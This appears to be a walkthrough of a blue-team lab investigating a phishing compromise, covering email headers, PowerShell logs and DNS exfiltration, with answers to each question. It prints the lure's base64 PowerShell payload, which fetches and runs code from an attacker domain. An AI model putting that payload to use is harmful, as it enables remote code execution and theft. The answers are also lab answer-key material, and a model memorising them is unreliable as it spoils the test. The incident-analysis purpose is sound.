## Overview

### The Boogeyman is here!

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

![image](https://github.com/user-attachments/assets/881e4709-5ae7-408c-bb19-d2e6ef505087)

The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.

You are tasked to analyse and assess the impact of the compromise.

## Email Analysis

This beginning analysis is pretty straightforward. All information can be found viewing the email using the application or looking at the text version format of the email. We can also use mxtoolbox and copy/paste the header to have it analzyed as well. 


### What is the email address used to send the phishing email?
agriffin@bpakcaging[.]xyz

### What is the email address of the victim?
julianne[.]westcott@hotmail[.]com

### What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?
elasticemail

### What is the name of the file inside the encrypted attachment?
Invoice_20230103.lnk

### What is the password of the encrypted attachment?
Invoice2023!

### Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?
Used the lnkparse tool on the downloaded lnk file to find cmd arguments.

aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==



## Endpoint Security

Based on the initial findings, we discovered how the malicious attachment compromised Julianne's workstation:
A PowerShell command was executed.
Decoding the payload reveals the starting point of endpoint activities. 

### Investigation Guide
With the following discoveries, we should now proceed with analysing the PowerShell logs to uncover the potential impact of the attack:
Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.
Since the given data is JSON, we can parse it in CLI using the jq command.
Note that some logs are redundant and do not contain any critical information; hence can be ignored.


### What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)
Here we will take the syntax provided and tack on scriptblocktext and parse through to find the two domains. cdn.bpakcaging.xyz,files.bpakcaging.xyz
![Screenshot 2024-10-01 085336](https://github.com/user-attachments/assets/003069a3-9e89-4356-9c91-616a019f9c50)


### What is the name of the enumeration tool downloaded by the attacker?
The same text has the answer below

![Screenshot 2024-10-01 094017](https://github.com/user-attachments/assets/e2bbd076-fd36-44ee-9d6f-48696f9559b0)


### What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.
Here we added onto the filter to follow the keywords “sq3.exe” and “cd” to follow the path
![Screenshot 2024-10-01 110955](https://github.com/user-attachments/assets/1cf529a6-50a2-42a8-b28f-8df5e1f38204)


### What is the software that uses the file in Q3?
Just looking back on the path we can see the answer: Microsoft Sticky Notes

### What is the name of the exfiltrated file?
Using our initial filter we can find this information in the beginning.
![Screenshot 2024-10-01 112027](https://github.com/user-attachments/assets/e363fb61-f240-4af8-82da-0d86589a2c87)


### What type of file uses the .kdbx file extension?
A google search should work here: KeePass

### What is the encoding used during the exfiltration attempt of the sensitive file?
Initial filter shows this info: hex
![Screenshot 2024-10-01 112253](https://github.com/user-attachments/assets/a4e11d66-bac2-4f99-9980-fe2a82b36348)


### What is the tool used for exfiltration?
Our image for our last question shows this as well: nslookup



## Network Traffic Analysis
Based on the PowerShell logs investigation, we have seen the full impact of the attack:
The threat actor was able to read and exfiltrate two potentially sensitive files.
The domains and ports used for the network activity were discovered, including the tool used by the threat actor for exfiltration.

### Investigation Guide
Finally, we can complete the investigation by understanding the network traffic caused by the attack:
Utilise the domains and ports discovered from the previous task.
All commands executed by the attacker and all command outputs were logged and stored in the packet capture.
Follow the streams of the notable commands discovered from PowerShell logs.
Based on the PowerShell logs, we can retrieve the contents of the exfiltrated data by understanding how it was encoded and extracted.

### What software is used by the attacker to host its presumed file/payload server?
We can search for files.bpakcaging.xyz, and filter for http, then follow the tcp stream
![Screenshot 2024-10-01 113319](https://github.com/user-attachments/assets/3488ee77-486b-48f2-b548-19c85bab0899)


### What HTTP method is used by the C2 for the output of the commands executed by the attacker?
The output of the commands by the attacker are POST.

### What is the protocol used during the exfiltration activity?
We saw that DNS lookup was used to exfiltrate the file.

### What is the password of the exfiltrated file?
We know that sq3.exe was used to touch the plum file, filtering for this, http contains “sq3.exe” and following the tcp path, we can manually look at the next packet and find the password and decode it.

### What is the credit card number stored inside the exfiltrated file?
This was pretty difficult. I had trouble trying to figure out how to decode and output the file in order input the password. I ended up looking online for some syntax and found this.

$$ tshark -r capture.pcapng -Y "ip.dst==167.71.211.113 and dns" -T fields -e dns.qry.name | grep -E '[A-F0-9]+.bpakcaging.xyz$' | cut -d'.' -f1 | tr -d '\n' | xxd -p -r > protected_data.kdbx

Found out this was what I was missing intially.

 `| xxd -p -r > sometextfile `
- **`xxd -p -r`**: Converts the hexadecimal string back into binary data.
  - `-p`: Specifies plain (hex) mode.
  - `-r`: Reverses the process, converting hex to binary.









